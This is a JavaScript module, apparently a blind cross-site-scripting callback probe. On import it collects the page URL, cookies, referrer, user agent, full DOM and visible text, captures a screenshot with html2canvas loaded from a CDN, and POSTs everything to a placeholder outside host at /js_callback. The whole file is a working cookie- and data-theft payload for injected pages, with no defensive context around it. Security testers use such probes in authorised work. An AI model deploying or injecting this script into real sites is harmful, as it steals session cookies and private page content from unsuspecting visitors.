// probe_z.js - ES module to be served at /z
// Sends collected data + screenshot to [HOST_URL]/js_callback on import

// Utility: converts base64 to Blob (used for screenshot upload)
function base64_to_blob(b64Data, contentType = "application/octet-stream") {
  const byteCharacters = atob(b64Data);
  const byteArrays = [];
  const sliceSize = 1024;

  for (let offset = 0; offset < byteCharacters.length; offset += sliceSize) {
    const slice = byteCharacters.slice(offset, offset + sliceSize);
    const byteNumbers = new Array(slice.length);
    for (let i = 0; i < slice.length; i++) {
      byteNumbers[i] = slice.charCodeAt(i);
    }
    byteArrays.push(new Uint8Array(byteNumbers));
  }

  return new Blob(byteArrays, { type: contentType });
}

// Send probe data as POST with optional screenshot
function sendCallback(data) {
  const formData = new FormData();

  for (const [key, value] of Object.entries(data)) {
    if (key === "screenshot" && value.startsWith("data:image/png;base64,")) {
      const base64Data = value.split(",")[1];
      formData.append("screenshot", base64_to_blob(base64Data, "image/png"), "screenshot.png");
    } else {
      formData.append(key, value);
    }
  }

  const xhr = new XMLHttpRequest();
  xhr.open("POST", "[HOST_URL]/js_callback", true);
  xhr.send(formData);
}

// Prepare the data to send
const payloadData = {
  uri: location.href,
  cookies: document.cookie,
  referrer: document.referrer,
  "user-agent": navigator.userAgent,
  "browser-time": Date.now().toString(),
  title: document.title || "",
  dom: document.documentElement.outerHTML || "",
  text: document.body ? (document.body.innerText || document.body.textContent || "") : "",
  origin: location.origin,
  was_iframe: window.top !== window.self ? "true" : "false",
  injection_key: "" // optional, add if you have an injection key
};

// Function that captures a screenshot via html2canvas and then sends the callback
function captureScreenshotAndSend() {
  if (typeof html2canvas !== "undefined") {
    html2canvas(document.body).then((canvas) => {
      payloadData.screenshot = canvas.toDataURL("image/png");
      sendCallback(payloadData);
    }).catch(() => {
      // If capturing fails, send without screenshot
      sendCallback(payloadData);
    });
  } else {
    // Dynamically load html2canvas from CDN then retry
    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js";
    script.onload = captureScreenshotAndSend;
    document.body.appendChild(script);
  }
}

// Start logic immediately
captureScreenshotAndSend();
